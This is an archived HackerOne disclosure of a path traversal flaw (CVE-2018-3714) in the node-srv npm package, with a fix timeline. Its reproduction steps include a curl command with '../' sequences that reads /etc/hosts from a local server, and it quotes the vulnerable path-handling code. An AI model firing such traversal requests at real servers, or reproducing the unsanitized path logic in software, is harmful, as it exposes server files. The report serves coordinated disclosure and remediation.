---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
  - stack/node
  - vuln/path-traversal
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2018-03-07
submitted: 2018-01-25T20:00:51.494Z
bounty_usd: null
votes: 6
cve: "CVE-2018-3714"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "bl4de"
source: "https://hackerone.com/reports/309124"
title: "[node-srv] Path Traversal allows to read arbitrary files from remote server"
---
# [node-srv] Path Traversal allows to read arbitrary files from remote server

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 6 | **Program:** Node.js third-party modules | **Disclosed:** 2018-03-07

- Report: [https://hackerone.com/reports/309124](https://hackerone.com/reports/309124)
- CWE: Path Traversal | CVE: CVE-2018-3714
- Submitted: 2018-01-25T20:00:51.494Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi Guys,

**node-srv** contains Path Traversal vulnerability, which allows malicious user to read content of any file with known path.

**Module:** 

Simple static node.js server. Supports Heroku and Grunt.js
https://www.npmjs.com/package/node-srv


**Description**

```node-srv``` does not sanitize path in the correct way, so ```curl``` can be used to retrieve content of any file from the remote server.



## Steps To Reproduce:

- install ```node-srv```

```
$ npm install node-srv
```

- create simple server:

```javascript
//Require module 
var Server = require('node-srv');

// Start server 
var srv = new Server({
    port: 8080,
    root: './',
    logs: true
}, function () {
    console.log('Server stopped');
});
```

- run server:

```
$ node app.js
```

- visit ```http://127.0.0.1:8080``` to verify if everything is fine.

- now, run following ```curl``` command (please adjust numbers of ../ to your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../etc/hosts
```

You should see the content of ```/etc/hosts``` file:

{F257357}


The problem is that url read from the user is not sanitize in any way against classic ```../``` path traversal payload:


```javascript
return new Promise((function(_this) {
        return function(resolve, reject) {
          var uri;
          uri = url.parse(req.url);
          return resolve(uri.pathname);
        };
      })(this)).then((function(_this) {
        return function(pathname) {
          filePath = pathname;
          filePath = filePath.replace(/\/$/, "/" + _this.options.index);
          filePath = filePath.replace(/^\//, "");
          filePath = path.resolve(process.cwd(), _this.options.root || './', filePath);
          return _this.processRequest(res, filePath);
        };
```



## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.3
- node 8.9.3
- npm 5.5.1
- curl 7.54.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability allows malicious user to read content of any file on the server, which leads to data breach or other attacks.

## Timeline

- **Report Filed**
- **Report Triaged**
- **Report Severity Updated**
- **Changed Scope**
- **Report Severity Updated**
- **Report Severity Updated**
- **Cve Id Added**
- **2018-01-26** @bl4de: Hi @lirantal ,

Thank you for verifying my report.

I haven't contacted project maintainer as my intention was to keep the whole process consistent through the program. Also I didn't want to open issue on its GitHub repository to not cause any security issues to this module users before it will be fixed and patch will be available.

Regards,
bl4de
- **Report Severity Updated**
- **External User Joined**
- **2018-02-05** @nim579: Hi @bl4de ,
FIxed in version `v2.1.1`.
See [commit](https://github.com/nim579/node-srv/commit/15be996c0520ac6e4dee0cf0808fc7e72effd2a2) in package repo.

Thanks for report!
- **2018-02-05** @bl4de: Hi @nim579 ,

Thank you for resolving this :)
Looks great to me, I can't reproduce the issue anymore.

Regards,
bl4de
- **Report Severity Updated**
- **2018-02-05** @lirantal: Great! Thank you both for the quick response.

Are you both ok with a full public disclosure for this report? we'll publicly disclose it within 45 days since it was triaged (you can read more on the policy here: https://github.com/nodejs/security-wg/blob/master/processes/third_party_vuln_process.md)
- **Report Resolved**
- **Agreed On Going Public**
- **2018-02-05** @bl4de: Yes, I'm fine with public disclosure.
- **2018-02-05** @nim579: Ok, public it
- **Report Severity Updated**
- **Report Severity Updated**
- **Report Severity Updated**
- **Report Became Public**
